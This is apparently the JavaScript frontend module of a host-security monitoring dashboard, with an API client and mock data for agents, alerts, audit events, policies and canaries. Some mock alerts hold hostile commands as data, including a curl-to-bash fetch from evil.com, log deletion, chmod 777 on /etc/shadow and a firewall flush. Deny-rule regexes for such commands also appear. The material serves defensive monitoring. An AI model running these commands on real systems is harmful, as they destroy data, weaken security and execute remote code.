// ═══ API Client ═══
const API_BASE = import.meta.env?.VITE_API_URL || 'http://localhost:8080';
class ApiClient {
    token = null;
    constructor() {
        const stored = localStorage.getItem('flowlink_token');
        if (stored)
            this.token = stored;
    }
    getToken() { return this.token; }
    setToken(token) {
        this.token = token;
        if (token)
            localStorage.setItem('flowlink_token', token);
        else
            localStorage.removeItem('flowlink_token');
    }
    headers() {
        const h = { 'Content-Type': 'application/json' };
        if (this.token)
            h['Authorization'] = `Bearer ${this.token}`;
        return h;
    }
    async request(method, path, body) {
        const res = await fetch(`${API_BASE}${path}`, {
            method,
            headers: this.headers(),
            body: body ? JSON.stringify(body) : undefined,
        });
        if (!res.ok) {
            const error = await res.json().catch(() => ({ error: res.statusText }));
            throw new Error(error.error || `HTTP ${res.status}`);
        }
        return res.json();
    }
    async requestText(method, path) {
        const res = await fetch(`${API_BASE}${path}`, { method, headers: this.headers() });
        if (!res.ok)
            throw new Error(`HTTP ${res.status}`);
        return res.text();
    }
    // Health
    getHealth() { return this.request('GET', '/health'); }
    // Agents
    getAgents() { return this.request('GET', '/api/agents'); }
    registerAgent(agent) { return this.request('POST', '/api/agents/register', agent); }
    removeAgent(id) { return this.request('DELETE', `/api/agents/${id}`); }
    // Shield
    getAlerts() { return this.request('GET', '/api/shield/alerts'); }
    approveAlert(pid) { return this.request('POST', `/api/shield/approve/${pid}`); }
    rejectAlert(pid) { return this.request('POST', `/api/shield/reject/${pid}`); }
    resolveAlert(data) { return this.request('POST', '/api/shield/resolve', data); }
    getShieldStats() { return this.request('GET', '/api/shield/stats'); }
    // Audit
    getAuditEvents(params = {}) {
        const qs = new URLSearchParams(Object.entries(params).filter(([, v]) => v !== undefined && v !== null && v !== '').map(([k, v]) => [k, String(v)])).toString();
        return this.request('GET', `/api/audit${qs ? `?${qs}` : ''}`);
    }
    getAuditStats() { return this.request('GET', '/api/audit/stats'); }
    exportAudit(format) { return this.requestText('GET', `/api/audit/export?format=${format}`); }
    // Approvals
    getApprovals() { return this.request('GET', '/api/approvals'); }
    approveRequest(id) { return this.request('POST', `/api/approvals/${id}/approve`); }
    rejectRequest(id) { return this.request('POST', `/api/approvals/${id}/reject`); }
    // Devices
    getDevices() { return this.request('GET', '/api/devices'); }
    pairDevice(data) { return this.request('POST', '/api/devices/pair', data); }
    confirmPairing(data) { return this.request('POST', '/api/devices/confirm', data); }
    removeDevice(id) { return this.request('DELETE', `/api/devices/${id}`); }
    // Metrics
    getMetrics() { return this.requestText('GET', '/metrics'); }
    // SSE URL helper
    getSSEUrl() {
        const base = `${API_BASE}/api/events`;
        return this.token ? `${base}?token=${this.token}` : base;
    }
    // API base for external use
    getApiBase() { return API_BASE; }
}
export const api = new ApiClient();
// ═══ Mock Data (fallback when relay is offline) ═══
const NOW = Date.now();
const HOUR = 3600000;
const DAY = 86400000;
const hostnames = ['prod-web-01', 'prod-api-02', 'staging-db', 'ci-runner-03', 'dev-laptop', 'prod-worker-05', 'monitor-01', 'bastion-01'];
export const mockAgents = hostnames.map((h, i) => ({
    id: `agent-${String(i + 1).padStart(3, '0')}`,
    hostname: h,
    os: ['Ubuntu 22.04', 'Debian 12', 'macOS 14', 'CentOS 9'][i % 4],
    version: '0.9.2',
    status: i < 6 ? 'online' : 'offline',
    last_heartbeat: new Date(NOW - i * HOUR * 2).toISOString(),
    tags: i < 4 ? ['production', 'critical'] : i < 6 ? ['staging'] : ['dev'],
    cpu: Math.round(Math.random() * 80 + 10),
    ram: Math.round(Math.random() * 70 + 20),
    disk: Math.round(Math.random() * 60 + 30),
    sessions_count: Math.floor(Math.random() * 5),
    ip: `10.0.${i}.${i + 10}`,
}));
export const mockAlerts = [
    { alert_id: 'alt-001', pid: 12345, uid: 1000, username: 'deployer', command: 'rm -rf /var/log/*', rule_name: 'dangerous-rm', action: 'intercept', timestamp: NOW - 300000, agent_id: 'agent-001', resolved: false, approved: undefined, threat_level: 'L3', risk_score: 92 },
    { alert_id: 'alt-002', pid: 12346, uid: 0, username: 'root', command: 'chmod 777 /etc/shadow', rule_name: 'permission-change', action: 'intercept', timestamp: NOW - 600000, agent_id: 'agent-002', resolved: false, approved: undefined, threat_level: 'L3', risk_score: 95 },
    { alert_id: 'alt-003', pid: 12347, uid: 1001, username: 'devops', command: 'curl http://evil.com/payload.sh | bash', rule_name: 'remote-exec', action: 'intercept', timestamp: NOW - 900000, agent_id: 'agent-003', resolved: false, approved: undefined, threat_level: 'L2', risk_score: 78 },
    { alert_id: 'alt-004', pid: 12348, uid: 1000, username: 'deployer', command: 'systemctl stop nginx', rule_name: 'service-stop', action: 'alert', timestamp: NOW - 1800000, agent_id: 'agent-001', resolved: true, approved: true, threat_level: 'L2', risk_score: 55 },
    { alert_id: 'alt-005', pid: 12349, uid: 1001, username: 'devops', command: 'docker rm $(docker ps -aq)', rule_name: 'container-cleanup', action: 'alert', timestamp: NOW - 3600000, agent_id: 'agent-005', resolved: true, approved: false, threat_level: 'L1', risk_score: 30 },
    { alert_id: 'alt-006', pid: 12350, uid: 0, username: 'root', command: 'iptables -F', rule_name: 'firewall-modify', action: 'intercept', timestamp: NOW - 4200000, agent_id: 'agent-002', resolved: false, approved: undefined, threat_level: 'L3', risk_score: 88 },
    { alert_id: 'alt-007', pid: 12351, uid: 1002, username: 'analyst', command: 'cat /etc/passwd', rule_name: 'sensitive-read', action: 'alert', timestamp: NOW - 5400000, agent_id: 'agent-004', resolved: true, approved: true, threat_level: 'L1', risk_score: 25 },
];
const eventTypes = ['command_executed', 'command_intercepted', 'session_started', 'session_ended', 'agent_heartbeat', 'canary_triggered', 'policy_violation'];
const users = ['deployer', 'root', 'devops', 'analyst', 'admin'];
const commands = ['ls -la', 'systemctl restart nginx', 'docker ps', 'rm -rf /tmp/old', 'cat /var/log/syslog', 'apt update', 'kubectl get pods', 'npm install'];
export const mockAuditEvents = Array.from({ length: 50 }, (_, i) => ({
    id: `evt-${String(i + 1).padStart(4, '0')}`,
    agent_id: `agent-${String((i % 8) + 1).padStart(3, '0')}`,
    event_type: eventTypes[i % eventTypes.length],
    timestamp_nanos: (NOW - i * HOUR * 0.5) * 1e6,
    timestamp_iso: new Date(NOW - i * HOUR * 0.5).toISOString(),
    command: i % 3 === 0 ? commands[i % commands.length] : undefined,
    user: users[i % users.length],
    risk_score: eventTypes[i % eventTypes.length] === 'command_intercepted' ? Math.round(Math.random() * 60 + 40) : undefined,
    action: ['allow', 'deny', 'intercept'][i % 3],
    result: i % 5 === 0 ? 'denied' : 'allowed',
    metadata: {},
}));
export const mockSessions = Array.from({ length: 8 }, (_, i) => ({
    id: `sess-${String(i + 1).padStart(3, '0')}`,
    agent_id: `agent-${String((i % 6) + 1).padStart(3, '0')}`,
    user: users[i % users.length],
    origin: `10.0.${i}.100`,
    started_at: new Date(NOW - i * HOUR * 3).toISOString(),
    duration_ms: i * HOUR * 3,
    commands_count: Math.floor(Math.random() * 200 + 10),
    status: i < 3 ? 'active' : 'ended',
    terminal: i % 2 === 0 ? 'xterm-256color' : 'screen',
}));
export const mockBackups = Array.from({ length: 12 }, (_, i) => ({
    id: `bak-${String(i + 1).padStart(3, '0')}`,
    agent_id: `agent-${String((i % 6) + 1).padStart(3, '0')}`,
    hostname: hostnames[i % hostnames.length],
    files: ['/etc/nginx/nginx.conf', '/var/lib/mysql', '/opt/app/.env', '/home/deploy/.ssh/authorized_keys'].slice(0, Math.floor(Math.random() * 4 + 1)),
    size_bytes: Math.round(Math.random() * 500000000 + 10000000),
    timestamp: new Date(NOW - i * HOUR * 6).toISOString(),
    status: i === 0 ? 'in_progress' : i === 5 ? 'failed' : 'completed',
}));
export const mockPolicies = [
    { name: 'Block dangerous rm', action: 'deny', conditions: { command_match: 'rm\\s+-rf\\s+/', user: '*' }, priority: 100, enabled: true },
    { name: 'Intercept sudo commands', action: 'intercept', conditions: { command_match: '^sudo\\s+', user: '*' }, priority: 90, enabled: true },
    { name: 'Alert on sensitive file reads', action: 'alert', conditions: { command_match: '/etc/(shadow|passwd|ssh)', user: '*' }, priority: 80, enabled: true },
    { name: 'Block network config changes', action: 'deny', conditions: { command_match: '(iptables|ufw|nft)\\s+-F', user: '*' }, priority: 95, enabled: true },
    { name: 'Allow apt updates', action: 'allow', conditions: { command_match: '^apt\\s+(update|upgrade)', user: 'root' }, priority: 10, enabled: true },
    { name: 'Allow docker commands for ops', action: 'allow', conditions: { command_match: '^docker\\s+', user: 'devops' }, priority: 20, enabled: true },
];
export const mockDevices = [
    { id: 'dev-001', name: "Aleksandr's iPhone", type: 'ios', last_active: new Date(NOW - 60000).toISOString(), status: 'active' },
    { id: 'dev-002', name: 'MacBook Pro', type: 'macos', last_active: new Date(NOW - 300000).toISOString(), status: 'active' },
    { id: 'dev-003', name: 'Pixel 8 Pro', type: 'android', last_active: new Date(NOW - DAY).toISOString(), status: 'inactive' },
    { id: 'dev-004', name: 'iPad Air', type: 'ios', last_active: new Date(NOW - DAY * 3).toISOString(), status: 'inactive' },
];
export const mockUsers = [
    { username: 'admin', roles: ['admin'], allowed_paths: ['*'], status: 'active', created_at: '2025-01-15T10:00:00Z' },
    { username: 'deployer', roles: ['operator'], allowed_paths: ['/opt/app', '/var/log/app'], status: 'active', created_at: '2025-02-20T14:30:00Z' },
    { username: 'devops', roles: ['operator', 'viewer'], allowed_paths: ['/opt', '/etc/nginx', '/var/log'], status: 'active', created_at: '2025-03-10T09:00:00Z' },
    { username: 'analyst', roles: ['viewer'], allowed_paths: ['/var/log'], status: 'active', created_at: '2025-04-01T11:00:00Z' },
    { username: 'intern', roles: ['viewer'], allowed_paths: ['/tmp'], status: 'disabled', created_at: '2025-05-15T08:00:00Z' },
];
export const mockCanaries = [
    { path: '/etc/.canary-ssh-key', agent_id: 'agent-001', triggers_count: 3, last_triggered: new Date(NOW - HOUR).toISOString() },
    { path: '/opt/app/.canary-env', agent_id: 'agent-002', triggers_count: 1, last_triggered: new Date(NOW - DAY * 2).toISOString() },
    { path: '/var/log/.canary-access', agent_id: 'agent-003', triggers_count: 0 },
    { path: '/root/.canary-bashrc', agent_id: 'agent-001', triggers_count: 7, last_triggered: new Date(NOW - HOUR * 3).toISOString() },
];
export const mockSystemInfo = {
    version: '0.9.2',
    uptime: '14d 6h 32m',
    memory_usage: 42,
    cpu_usage: 18,
};
export const mockDashboardStats = {
    total_agents: 8,
    online_agents: 6,
    active_alerts: 4,
    commands_today: 1247,
    uptime_pct: 99.7,
    l1_count: 23,
    l2_count: 12,
    l3_count: 4,
};
export const mockCommandsOver24h = Array.from({ length: 24 }, (_, i) => ({
    hour: `${String(i).padStart(2, '0')}:00`,
    commands: Math.round(Math.sin(i / 3.8) * 30 + 50 + Math.random() * 20),
}));
export const mockInterceptionsOverTime = Array.from({ length: 7 }, (_, i) => ({
    date: new Date(NOW - (6 - i) * DAY).toLocaleDateString('en', { weekday: 'short' }),
    interceptions: Math.round(Math.random() * 15 + 2),
    approvals: Math.round(Math.random() * 10),
    rejections: Math.round(Math.random() * 5),
}));
export const mockTopDangerousCommands = [
    { command: 'rm -rf /', count: 12 },
    { command: 'chmod 777 /etc', count: 8 },
    { command: 'curl | bash', count: 6 },
    { command: 'iptables -F', count: 5 },
    { command: 'sudo su -', count: 4 },
];
export const mockStorageByAgent = [
    { agent: 'prod-web-01', used: 2.4, total: 10 },
    { agent: 'prod-api-02', used: 5.1, total: 10 },
    { agent: 'staging-db', used: 8.7, total: 10 },
    { agent: 'ci-runner-03', used: 1.2, total: 10 },
    { agent: 'dev-laptop', used: 0.5, total: 10 },
];
export const mockPromMetrics = `# HELP flowlink_agents_total Total registered agents
# TYPE flowlink_agents_total gauge
flowlink_agents_total{status="online"} 6
flowlink_agents_total{status="offline"} 2

# HELP flowlink_commands_total Total commands executed
# TYPE flowlink_commands_total counter
flowlink_commands_total 1247

# HELP flowlink_shield_interceptions_total Total shield interceptions
# TYPE flowlink_shield_interceptions_total counter
flowlink_shield_interceptions_total{level="L3"} 4
flowlink_shield_interceptions_total{level="L2"} 12
flowlink_shield_interceptions_total{level="L1"} 23

# HELP flowlink_sessions_active Active sessions
# TYPE flowlink_sessions_active gauge
flowlink_sessions_active 3

# HELP flowlink_uptime_seconds Relay uptime
# TYPE flowlink_uptime_seconds counter
flowlink_uptime_seconds 1234567`;
